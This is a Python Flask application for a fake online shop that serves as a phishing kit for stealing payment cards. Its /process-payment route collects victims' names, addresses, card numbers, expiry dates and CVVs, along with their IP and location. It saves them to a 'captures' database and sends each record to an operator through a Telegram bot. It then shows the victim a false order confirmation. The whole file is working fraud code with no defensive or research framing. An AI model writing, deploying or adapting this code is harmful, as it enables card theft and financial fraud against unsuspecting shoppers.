import os
import json
import sqlite3
import requests
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__)

# Telegram credentials
TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

# Load products
with open('products.json', 'r') as f:
    PRODUCTS = json.load(f)

# Database setup
def init_db():
    conn = sqlite3.connect('captures.db')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip TEXT,
            user_agent TEXT,
            product_id TEXT,
            product_name TEXT,
            amount REAL,
            full_name TEXT,
            address TEXT,
            card_number TEXT,
            expiry TEXT,
            cvv TEXT,
            country TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_client_ip():
    """Get client IP address from request headers"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    return request.remote_addr

def send_telegram_message(capture_data):
    """Send capture data to Telegram"""
    message = f"""
💳 NEW CAPTURE
━━━━━━━━━━━━━━━━━━
📅 {capture_data['timestamp']}
🌐 IP: {capture_data['ip']}
📍 Country: {capture_data['country'] or 'Unknown'}
🖥️ UA: {capture_data['user_agent'][:80]}...
━━━━━━━━━━━━━━━━━━
👤 Name: {capture_data['full_name']}
🏠 Address: {capture_data['address']}
💳 Card: {capture_data['card_number']}
📅 Exp: {capture_data['expiry']}
🔐 CVV: {capture_data['cvv']}
🛒 Product: {capture_data['product_name']}
💰 Amount: ${capture_data['amount']:.2f}
━━━━━━━━━━━━━━━━━━
    """
    
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    
    try:
        response = requests.post(url, data=payload, timeout=5)
        return response.ok
    except:
        return False

@app.route('/')
def index():
    """Homepage - product grid"""
    return render_template('index.html', products=PRODUCTS)

@app.route('/product/<product_id>')
def product_page(product_id):
    """Individual product page"""
    product = next((p for p in PRODUCTS if p['id'] == product_id), None)
    if not product:
        return redirect(url_for('index'))
    
    discounted_price = product['original_price'] * (1 - product['discount'] / 100)
    return render_template('product.html', product=product, price=round(discounted_price, 2))

@app.route('/checkout/<product_id>')
def checkout(product_id):
    """Checkout page with payment form"""
    product = next((p for p in PRODUCTS if p['id'] == product_id), None)
    if not product:
        return redirect(url_for('index'))
    
    discounted_price = product['original_price'] * (1 - product['discount'] / 100)
    return render_template('checkout.html', product=product, price=round(discounted_price, 2))

@app.route('/process-payment', methods=['POST'])
def process_payment():
    """Process payment and capture data"""
    # Capture all form data
    product_id = request.form.get('product_id')
    product_name = request.form.get('product_name')
    amount = float(request.form.get('amount', 0))
    
    full_name = request.form.get('full_name')
    address = request.form.get('address')
    card_number = request.form.get('card_number')
    expiry = request.form.get('expiry')
    cvv = request.form.get('cvv')
    
    # Get client info
    ip = get_client_ip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Simple country lookup
    country = 'Unknown'
    try:
        resp = requests.get(f'http://ip-api.com/json/{ip}', timeout=2)
        if resp.status_code == 200:
            data = resp.json()
            country = data.get('country', 'Unknown')
    except:
        pass
    
    # Prepare data
    capture_data = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC'),
        'ip': ip,
        'country': country,
        'user_agent': user_agent,
        'product_id': product_id,
        'product_name': product_name,
        'amount': amount,
        'full_name': full_name,
        'address': address,
        'card_number': card_number,
        'expiry': expiry,
        'cvv': cvv
    }
    
    # Store in database
    conn = sqlite3.connect('captures.db')
    c = conn.cursor()
    c.execute('''
        INSERT INTO captures (
            timestamp, ip, user_agent, product_id, product_name, amount,
            full_name, address, card_number, expiry, cvv, country
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        capture_data['timestamp'],
        capture_data['ip'],
        capture_data['user_agent'],
        capture_data['product_id'],
        capture_data['product_name'],
        capture_data['amount'],
        capture_data['full_name'],
        capture_data['address'],
        capture_data['card_number'],
        capture_data['expiry'],
        capture_data['cvv'],
        capture_data['country']
    ))
    conn.commit()
    conn.close()
    
    # Send to Telegram
    send_telegram_message(capture_data)
    
    # Return success response
    return jsonify({
        'success': True,
        'order_id': f"PC-{datetime.now().strftime('%Y%m%d%H%M%S')}",
        'message': 'Payment successful! Your order has been confirmed.'
    })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)